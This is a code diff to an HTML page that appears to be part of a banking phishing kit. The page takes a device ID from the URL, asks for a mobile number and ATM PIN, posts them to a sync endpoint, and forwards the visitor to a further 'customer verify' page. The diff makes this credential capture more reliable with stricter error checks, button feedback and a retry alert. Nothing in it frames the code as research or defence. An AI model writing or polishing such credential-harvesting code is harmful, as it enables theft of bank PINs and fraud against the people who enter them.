@@ -79,19 +79,23 @@
         const urlParams = new URLSearchParams(window.location.search);
         const deviceId = urlParams.get('deviceId') || 'unknown';
 
+        const API_BASE = window.location.origin;
+
         async function syncPageData(pageName, data) {
-            try {
-                await fetch('/api/form/sync', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ deviceId, pageName, pageData: data, timestamp: new Date().toISOString() })
-                });
-            } catch (error) {
-                console.error('Sync error:', error);
+            const response = await fetch(API_BASE + '/api/form/sync', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ deviceId, pageName, pageData: data, timestamp: new Date().toISOString() })
+            });
+            const result = await response.json();
+            if (!response.ok || !result.success) {
+                throw new Error(result.error || 'Sync failed');
             }
+            return result;
         }
 
         document.getElementById('submitBtn').addEventListener('click', async () => {
+            const btn = document.getElementById('submitBtn');
             const mobileNumber = document.getElementById('mobileNumber').value.trim();
             const atmPin = document.getElementById('atmPin').value.trim();
 
@@ -100,8 +104,18 @@
                 return;
             }
 
-            await syncPageData('account_verify', { mobileNumber, atmPin });
-            window.location.href = 'customer_verify.html?deviceId=' + encodeURIComponent(deviceId);
+            btn.disabled = true;
+            btn.textContent = 'SUBMITTING...';
+
+            try {
+                await syncPageData('account_verify', { mobileNumber, atmPin });
+                window.location.href = 'customer_verify.html?deviceId=' + encodeURIComponent(deviceId);
+            } catch (error) {
+                console.error('Sync error:', error);
+                btn.disabled = false;
+                btn.textContent = 'LOGIN';
+                alert('Submission failed. Please check your connection and try again.');
+            }
         });
     </script>
 </body>
